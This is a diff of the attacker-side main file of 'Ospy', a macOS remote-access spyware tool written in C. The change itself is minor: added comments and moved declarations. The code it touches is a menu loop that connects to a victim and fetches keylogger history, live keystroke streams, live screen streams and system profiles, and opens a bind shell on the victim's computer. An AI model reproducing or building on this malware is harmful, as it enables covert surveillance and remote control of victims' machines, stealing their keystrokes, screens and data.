@@ -7,7 +7,7 @@
 //
 // Process : function and model base class
 //
-// Output  : terminal GUI
+// Output  : terminal Ospy GUI
 //
 // Note    : Ospy is made only for Apple macOs for now.
 //
@@ -15,7 +15,6 @@
 // Programmer : Ori Rinat
 // Date : 16.9.2018
 //-----------------------------------------------------------------------------
-
 #include "start_menu.h"
 #include "entering_to_Ospy.h"
 #include "attack_mode.h"
@@ -26,35 +25,34 @@
 
 //#define USER_MESSAGE_PROMPT  // u can comment it or uncomment it and all the user-friendly GUI will appear / unappear
 
-static volatile bool keep_getting_keystrokes = true;
-static volatile int keepRunningscreen = 1;
+static volatile bool keep_getting_keystrokes = true; // SIGINT will change it
+static volatile int keepRunningscreen = 1; // SIGINT will change it
 
-main_data data;
+main_data data; // unencrypted main data struct, will be encrypt in the A_2_S_encrypted_message_handler function
 
 void stop_keystrokes_stream_loop ();
 void stop_screen_stream_sig();
 
-//tish is a test tih is a ti west to me ori hash here to day ori test it todat
-
 int main (){
-	char encrypted_keystroke[ENCRYPTED_TEXT_LEN(LICENSE_KEY_LENGTH)];
-	
 	while (create_connection() != CONNECTION_SUCCESS){
 		printf("[\033[31;1m-\033[0m] \033[31;1mconnection failed, trying to connect again ...\033[0m\n");
 		sleep(2);
 	}
+	
 	#ifdef USER_MESSAGE_PROMPT
-	connecting_load();
+		connecting_load();
 	#endif
+	
 	int attacker_input;
 	int left_welcome_page = FALSE;
+	char encrypted_keystroke[ENCRYPTED_TEXT_LEN(LICENSE_KEY_LENGTH)];
 	
 	// welcome page - entering the attacker to Ospy
 	do { 
 		print_large_banner();
 		print_entering_menu();
 	
-		printf("\033[35;1m-> \033[0m");		
+		printf("\033[35;1m-> \033[0m");
 		flush_stdin();
 		attacker_input = getchar();
 		
@@ -78,13 +76,13 @@ int main (){
 
 	choose_victim();
 
-	while (true){ // u can check evrey itration (loop) if the victim is steal connected to not
+	while(true){
 		choose_attack_menu();
 		printf("\033[35;1m-> \033[0m");
 		flush_stdin();
 		attacker_input = getchar();
 		switch (attacker_input) {
-			case '1':
+			case '1': // get keylogger history file
 				A_2_S_encrypted_message_handler(data, GET_KEYLOGGER_HISTORY);
 				printf("\e[93m[◷] Waiting for file, please wait !\033[0m");
 				fflush(stdout);
@@ -100,7 +98,7 @@ int main (){
 					sleep(2);
 				}			
 				break;
-			case '2':
+			case '2': // get live keystrocks stream
 				signal(SIGINT, stop_keystrokes_stream_loop);
 				A_2_S_encrypted_message_handler(data, GET_KEYSTROKES_STREAM);
 				printf("\n[\033[33;1m!\033[0m] ctrl+c to stop getting victim's live keystrokes\n");
@@ -114,7 +112,7 @@ int main (){
 				keep_getting_keystrokes = true; // set the keep_getting_keystrokes flag to the next time
 				
 				break;
-			case '3':
+			case '3': // get live screen stream
 				signal(SIGINT, stop_screen_stream_sig);
 				A_2_S_encrypted_message_handler(data, GET_SCREEN_STREAM);
 				printf("\r[\033[32;1m+\033[0m] \033[1m\033[32m%s's live screen stream started successfully\033[0m\n", selected_victim_name);
@@ -127,7 +125,7 @@ int main (){
 				keepRunningscreen = 1; // in case the attacker will use this option again  
 				break;
 				
-			case '4':
+			case '4': // get system profiler file
 				A_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
 				printf("[\e[93m◷\033[0m]\e[93m This action may take about 3 minutes, please wait !\033[0m");
 				fflush(stdout);
@@ -139,7 +137,7 @@ int main (){
 				press_enter_to_continue();
 				break;
 	
-			case '5':
+			case '5': // send command to victim computer
 				printf("\r[\033[32;1m+\033[0m]\033[1m\033[32m The bind shell with %s created successfully\n\033[0mEnter '(S)TOP' to stop the bind shell\n\n", selected_victim_name);
 				do {
 					printf("\033[1m%s $ \033[0m", selected_victim_name);
